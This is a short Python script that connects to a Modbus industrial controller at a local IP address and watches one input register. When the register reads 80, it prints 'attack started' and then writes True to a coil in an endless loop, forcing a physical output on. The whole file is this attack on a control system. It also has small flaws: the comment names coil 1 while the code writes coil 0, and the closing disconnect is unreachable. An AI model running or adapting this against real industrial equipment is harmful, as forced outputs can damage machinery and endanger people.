import easymodbus.modbusClient

# Set up Modbus client
client = easymodbus.modbusClient.ModbusClient("192.168.10.116", 502) # IP address and port of Modbus server
client.connect()

while True:
    # Read input register value
    input_register_value = client.read_input_registers(0, 1)
    print(input_register_value)

    # If input register value is 80, write true to coil 1
    if input_register_value[0] == 80:
        print("attack started")
        while True:
            client.write_single_coil(0, True)

# Disconnect from Modbus server
client.close()
